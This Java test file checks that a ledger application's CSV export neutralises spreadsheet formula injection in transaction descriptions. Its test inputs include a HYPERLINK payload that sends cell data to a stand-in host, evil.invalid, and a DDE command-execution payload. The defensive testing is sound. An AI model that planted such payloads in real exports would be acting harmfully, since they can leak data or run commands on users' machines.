package com.example.ledger;

import static com.example.ledger.testing.Check.equal;
import static com.example.ledger.testing.Check.isTrue;
import static com.example.ledger.testing.Check.test;

import com.example.ledger.io.CsvExporter;
import com.example.ledger.io.CsvImporter;
import com.example.ledger.io.CsvParser;
import com.example.ledger.testing.Check;
import java.time.LocalDate;
import java.util.List;

public final class HiddenCsvFormulaTest {
    private static final LocalDate DAY = LocalDate.of(2026, 3, 5);

    private static Ledger withMemos(String... memos) {
        Ledger ledger = Fixtures.sampleLedger();
        for (String memo : memos) {
            ledger.transfer("ACC-0001", "ACC-0200", Money.parse("12.50", "USD"), DAY, memo);
        }
        return ledger;
    }

    private static String description(String line) {
        return CsvParser.splitLine(line).get(1);
    }

    public static void main(String[] args) {
        String[] dangerous = {
            "=1+2",
            "+SUM(A1:A9)",
            "-2+3",
            "@cmd",
            "=HYPERLINK(\"http://evil.invalid/?d=\"&A1,\"Refund status\")",
            "=cmd|' /C calc'!A0",
        };

        test("formula-looking descriptions are neutralised", () -> {
            List<String> lines = CsvExporter.exportLines(withMemos(dangerous));
            for (int i = 0; i < dangerous.length; i++) {
                equal("'" + dangerous[i], description(lines.get(i + 2)));
            }
        });

        test("no exported text cell starts a formula", () -> {
            List<String> lines = CsvExporter.exportLines(withMemos(dangerous));
            for (String line : lines.subList(1, lines.size())) {
                List<String> fields = CsvParser.splitLine(line);
                equal(6, fields.size());
                String first = fields.get(1).isEmpty() ? "" : fields.get(1).substring(0, 1);
                isTrue(!List.of("=", "+", "-", "@", "\t", "\r").contains(first), line);
            }
        });

        test("ordinary text and numbers are unchanged", () -> {
            List<String> lines = CsvExporter.exportLines(withMemos("Coffee, beans", "Rent \"March\"", "e=mc2", "Refund -2"));
            equal("date,description,from,to,amount,currency", lines.get(0));
            equal("2026-03-01,Opening deposit,ACC-0100,ACC-0001,2500.00,USD", lines.get(1));
            equal("2026-03-05,\"Coffee, beans\",ACC-0001,ACC-0200,12.50,USD", lines.get(2));
            equal("Rent \"March\"", description(lines.get(3)));
            equal("e=mc2", description(lines.get(4)));
            equal("Refund -2", description(lines.get(5)));
        });

        test("export can still be imported", () -> {
            String csv = CsvExporter.export(withMemos("Groceries", "=1+2"));
            Ledger target = Fixtures.sampleLedger();
            List<Transaction> imported = new CsvImporter(target).importText(csv);
            equal(3, imported.size());
            equal(Money.parse("25.00", "USD"), target.balance("ACC-0200"));
            equal("'=1+2", imported.get(2).description());
        });

        Check.done();
    }
}
